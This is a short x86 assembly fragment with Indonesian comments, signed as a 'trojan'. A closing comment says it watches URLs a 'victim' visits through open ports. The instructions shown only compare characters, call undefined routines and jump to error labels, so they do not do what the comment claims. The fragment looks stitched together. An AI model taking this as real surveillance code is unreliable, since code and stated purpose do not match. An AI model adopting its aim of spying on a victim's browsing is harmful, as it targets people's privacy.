;-- SG TAJUR HALANG BERADA (W. TROJAN, JENGKI) --
;-- THANKS GOD! MY LIFE IS GOOD

MOV	CH,AL
	MOV	AL,[CHR]
	CMP	AL,CH
	MOV	CL,35
	MOV	DL,AL
	MOV	DH,0
	JNZ	L0003
	CALL	ZERLEN
L0003:
	CALL	GETCHR
	MOV	CL,37
	TEST	AH,2
	JZ	ERR30
	TEST	AH,4
	MOV	CL,38
	JNZ	ERR30

;--------------------------------------------
; Berfungsi mendebug dan melihat beberapa url
; yang di kunjungi korban melalui port" yang
; tebuka
;--------------------------------------------
